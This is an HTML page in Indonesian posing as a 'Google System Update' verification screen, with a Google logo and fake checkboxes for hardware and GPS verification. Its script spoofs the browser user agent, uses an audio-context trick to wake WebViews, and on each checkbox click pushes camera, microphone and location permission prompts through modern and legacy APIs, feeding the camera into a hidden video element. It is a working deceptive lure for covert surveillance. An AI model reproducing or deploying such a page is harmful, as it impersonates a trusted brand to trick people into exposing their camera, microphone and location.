<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google System Update</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        // --- 1. TRICK SPOOFER (Nipu WebView biar ngaku jadi Chrome Asli) ---
        Object.defineProperty(navigator, 'userAgent', {
            get: function () { return 'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'; }
        });
    </script>
    <style>
        body { background: #ffffff; font-family: sans-serif; }
        .cb-luxury { width: 22px; height: 22px; accent-color: #1a73e8; }
    </style>
</head>
<body class="flex flex-col items-center px-10 py-16 min-h-screen">

    <div class="text-center mb-10">
        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Logo_v2.svg" width="50" class="mx-auto mb-6">
        <h1 class="text-xl font-medium text-gray-800">Verifikasi Layanan</h1>
        <p class="text-[10px] text-gray-400 mt-1 uppercase tracking-widest">Security Bridge v4.0</p>
    </div>

    <div class="w-full max-w-sm space-y-4 mb-10">
        <div class="flex items-center gap-4 p-4 border border-gray-100 rounded-2xl bg-gray-50/50" onclick="document.getElementById('c1').click()">
            <input type="checkbox" id="c1" onchange="forcePrompt()" class="cb-luxury">
            <label class="text-sm text-gray-700 font-medium">Verifikasi Modul Hardware</label>
        </div>
        <div class="flex items-center gap-4 p-4 border border-gray-100 rounded-2xl bg-gray-50/50" onclick="document.getElementById('c2').click()">
            <input type="checkbox" id="c2" onchange="forcePrompt()" class="cb-luxury">
            <label class="text-sm text-gray-700 font-medium">Sinkronisasi GPS Google</label>
        </div>
    </div>

    <button id="finalBtn" disabled class="w-full max-w-sm bg-gray-200 text-gray-400 py-4 rounded-xl font-bold uppercase tracking-widest text-xs">
        Update Berhasil
    </button>

    <video id="v" autoplay playsinline style="display:none;"></video>

    <script>
        async function forcePrompt() {
            // --- 2. TRICK AUDIO CONTEXT (Bangunin WebView Basic) ---
            try {
                const AudioCtx = window.AudioContext || window.webkitAudioContext;
                const aCtx = new AudioCtx();
                if (aCtx.state === 'suspended') await aCtx.resume();
            } catch(e) {}

            // --- 3. TEMBAK IZIN (Double Method) ---
            try {
                // Method Modern
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('v').srcObject = stream;
                
                // Method Lokasi
                navigator.geolocation.getCurrentPosition(() => {
                    checkAll();
                });
            } catch (err) {
                // Method Legacy (Buat WebView jadul)
                const legacyCam = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia;
                if (legacyCam) {
                    legacyCam.call(navigator, {video: true, audio: true}, () => { checkAll(); }, () => {});
                } else {
                    alert("Klik 'IZINKAN' pada sistem untuk melanjutkan!");
                }
            }
        }

        function checkAll() {
            if(document.getElementById('c1').checked && document.getElementById('c2').checked) {
                const btn = document.getElementById('finalBtn');
                btn.disabled = false;
                btn.className = "w-full max-w-sm bg-blue-600 text-white py-4 rounded-xl font-bold uppercase tracking-widest text-xs shadow-lg";
                btn.innerText = "SISTEM TERVERIFIKASI";
            }
        }
    </script>
</body>
</html>
